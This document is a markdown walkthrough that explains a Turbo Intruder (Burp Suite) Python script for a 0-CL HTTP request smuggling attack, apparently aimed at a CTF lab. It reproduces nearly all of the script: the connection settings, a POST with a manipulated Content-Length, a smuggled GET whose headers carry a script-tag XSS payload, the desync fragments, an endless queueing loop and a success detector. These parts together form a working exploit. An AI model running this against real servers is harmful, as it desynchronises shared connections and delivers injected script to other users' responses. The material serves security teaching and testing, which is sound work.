# Reverse Engineering the “Turbo” Burp Intruder Script

## 0) What this script is for (in one line)
It automates a **0-CL / request-smuggling** attack by desynchronizing the front-end and back-end, smuggling a crafted request (with an XSS marker), and then probing with a “victim” request to observe success.

---

## 1) Global state

```python
stop_attack = False
```

- **Purpose:** Legacy flag used in earlier variants to stop the loop when a success marker appears. In the “manual-stop” version, this flag is not used to break the loop; it’s just left in place and harmless.
- **Impact:** No functional effect unless the loop checks it (the manual-stop version does not).

---

## 2) Entry point: `queueRequests(target, wordlists)`

This is called by Burp’s Intruder engine at attack start.

### 2.1 Request engine configuration

```python
engine = RequestEngine(
    endpoint=target.endpoint,
    concurrentConnections=10,
    requestsPerConnection=1,
    engine=Engine.BURP,
    maxRetriesPerRequest=0,
    timeout=15
)
```

- **endpoint:** Comes from Intruder’s target. All requests go there.
- **concurrentConnections=10:** Up to 10 TCP connections to increase race/desync chances.
- **requestsPerConnection=1:** Keeps each connection “fresh” (helps with precise queueing/ordering).
- **Engine.BURP:** Use Burp’s own HTTP stack.
- **maxRetriesPerRequest=0:** Don’t retry (retries can destroy timing for desync).
- **timeout=15:** Per-request timeout.

**Why:** Timing and connection reuse control are critical in desync attacks; these choices reduce variance and keep behavior predictable.

---

## 3) Request templates

The script defines multiple “building block” requests:

### 3.1 `kurnabiva1` (initial POST)

```http
POST /resources/images/avatarDefault.svg HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: %s
```

- Contains a `%s` placeholder that will be replaced by Intruder with a number.
- Crafted to look like a normal POST but with manipulated `Content-Length`.
- **Purpose:** This sets up the front-end/back-end desynchronization (classic 0-CL technique).

### 3.2 `smuggled` (payload)

```http
GET /post?postId=10 HTTP/1.1
User-Agent: yu5md"><script>alert(1)</script>hgpov
user-agent: yu5md"><script>alert(1)</script>hgpov
X: Y
```

- Deliberately malformed/duplicated headers.
- Carries the XSS payload (`<script>alert(1)</script>`) with marker `hgpov`.
- **Purpose:** This is the injected “ghost request” that rides inside the desync.

### 3.3 `kurnabiva2_chopped`

```http
GET / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 123
X: Y
```

- Fragment request to confuse the back-end parsing state.

### 3.4 `kurnabiva2_revealed`

```http
GET /404 HTTP/1.1
Host: {host}
User-Agent: foo
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
```

- Completes the chopped request.
- When combined with `smuggled`, it desynchronizes back-end’s view vs front-end’s view.

### 3.5 `victim`

```http
GET / HTTP/1.1
Host: {host}
User-Agent: foo
```

- Simple request used as probe.
- If the smuggled payload took effect, response here will reflect it.

---

## 4) Queueing logic

```python
while True:
    engine.queue(kurnabiva1, len(kurnabiva2_chopped), label='kurnabiva1', fixContentLength=False)
    engine.queue(kurnabiva2_chopped + kurnabiva2_revealed + smuggled, label='kurnabiva2')
    engine.queue(victim, label='victim')
```

- **Infinite loop**: Will run until the operator manually stops Intruder.
- Queues three types of requests in strict order:
  1. Desync setup (`kurnabiva1`)
  2. Desync trigger + smuggled payload (`kurnabiva2`)
  3. Probing request (`victim`)

---

## 5) Response handler

```python
def handleResponse(req, interesting):
    table.add(req)
    if req.label == 'victim' and 'hgpov' in req.response:
        print("[+] Donne, your exploit is finished!")
```

- Every response is logged in the Intruder table.
- For “victim” responses, script scans for marker `hgpov`.
- If found: prints success message.

**Note:** In this “manual-stop” version, the attack does not automatically halt; it simply prints confirmation. The operator must stop Intruder.

---

## 6) Attack logic flow

1. Send malformed POST with Content-Length mismatch.  
2. Immediately send crafted GET fragments + smuggled payload.  
3. Immediately send a “victim” probe.  
4. If back-end is desynced: smuggled payload will be executed and response will contain marker.  
5. Script prints success line.  
6. Operator manually stops Intruder.  

---

## 7) Key insights from reverse engineering

- **Minimalist but effective**: Only three request types.  
- **Reusable**: Can be adapted to different payloads.  
- **Operator-driven stop**: Puts analyst in control instead of auto-halting.  
- **Demonstration-oriented**: Its real purpose is educational / CTF-lab exploitation rather than stealth red-team work.  

---

## 8) Security implications

- Designed for **authorized security testing only**.  
- Demonstrates how subtle HTTP parsing quirks can lead to request smuggling and stored/ reflected XSS.  
- Highlights importance of aligning front-end/back-end parsers.  

---

## 9) Conclusion

This script is a hands-on educational tool for **HTTP request smuggling** research and CTFs. Its three-level structure (setup, smuggle, probe) is a distilled blueprint of desync exploitation.  
Reverse engineering confirms it is not malware; rather, it is a specialized exploitation aid for penetration testers.  
